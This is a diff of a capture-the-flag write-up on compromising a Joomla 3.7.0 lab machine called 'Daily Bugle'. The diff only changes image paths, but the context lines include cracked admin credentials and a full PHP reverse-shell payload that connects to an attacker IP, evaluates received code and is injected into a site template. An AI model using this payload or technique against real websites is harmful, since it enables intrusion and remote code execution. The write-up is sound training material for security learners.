@@ -49,7 +49,7 @@ This scan told me that the target looked to be a linux host, specifically runnin
 
 I opened the site in my browser to what looked like a news-focused blog.
 
-![daily index](/static/img/daily_bugle_http_index.png)
+![daily index](/images/daily_bugle_http_index.png)
 
 There wasn't any immediately links available to any sort of admin page, outside of a simple login panel on the homepage. Happy path clicking around the site also didn't yield any other information about potential users or even which CMS the site was using as far as I could identify. Without a hint of a username I didn't want to attempt any bruteforce.
 
@@ -96,7 +96,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 
 This returned a huge number of useful directories including an `/administrator` page that looked promising. Upon browsing to this page I found a standard admin login page.
 
-![daily administrator page](/static/img/daily_bugle_http_administrator.png)
+![daily administrator page](/images/daily_bugle_http_administrator.png)
 
 However, this atleast told me that I was investigating a Joomla site. Using the `auxiliary/scanner/http/joomla_version` module in metasploit I was able to also determine that this host was running version Joomla `3.7.0`.
 
@@ -363,7 +363,7 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completeds
 ```
 
-![daily bugle admin panel](/static/img/daily_bugle_http_admin_panel.png)
+![daily bugle admin panel](/images/daily_bugle_http_admin_panel.png)
 
 With these new-found credentials (`jonah:spiderman123`), I was able to get through to the admin panel. I imediately began clicking around to see if I could find a template or module that I could attempt to inject a shell into.
 
@@ -389,7 +389,7 @@ Payload size: 1114 bytes
 /*<?php /**/ error_reporting(0); $ip = '10.10.182.144'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
 ```
 
-![daily bugle shell injection](/static/img/daily_bugle_http_shell_in_template.png)
+![daily bugle shell injection](/images/daily_bugle_http_shell_in_template.png)
 
 I then opened the index.php template, saved the original contents to a backup file and copied the shell into the now empty body of the template. Prior to saving and executing I staged up my listener to catch the incoming shell.
 
@@ -502,7 +502,7 @@ msf5 post(multi/manage/shell_to_meterpreter) > sessions -k 1
 
 Once I had a stable shell established, I killed the original shell and quickly replaced the exploited template with its original contents before verifying that I was now able to see the original, unmodified index page.
 
-![daily bugle restored index](/static/img/daily_bugle_http_replaced_landing_page.png)
+![daily bugle restored index](/images/daily_bugle_http_replaced_landing_page.png)
 
 ### Local enumeration
 
